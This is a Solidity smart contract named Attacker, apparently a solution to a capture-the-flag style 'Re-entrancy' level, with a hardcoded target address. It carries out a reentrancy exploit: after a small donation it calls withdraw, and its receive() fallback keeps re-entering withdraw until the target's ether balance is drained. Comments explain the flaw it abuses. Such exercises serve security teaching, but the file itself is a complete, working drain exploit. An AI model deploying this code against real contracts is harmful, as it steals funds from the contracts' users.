// SPDX-License-Identifier: MIT
pragma solidity ^0.6.12;
pragma experimental ABIEncoderV2;

import './Re-entrancy.sol';


contract Attacker {
    Reentrance public reentrance = Reentrance(0xAC10925ca9460894cFEC04eE67Cc0E351762C5aB);
    // simple reentrancy attack, it deposits 0.001 ether to the Reentrance contract and then withdraws it
    // the fallback function is called when the Reentrance contract sends the ether back
    // this is possible because the withdraw function sets the balances after the external call
    function attack() public payable {
        reentrance.donate{value: 0.001 ether}(address(this));
        reentrance.withdraw(0.001 ether);
    }
    
    receive() external payable {
        if(address(reentrance).balance >= 0.001 ether) {
            reentrance.withdraw(0.001 ether);
    }
    }
}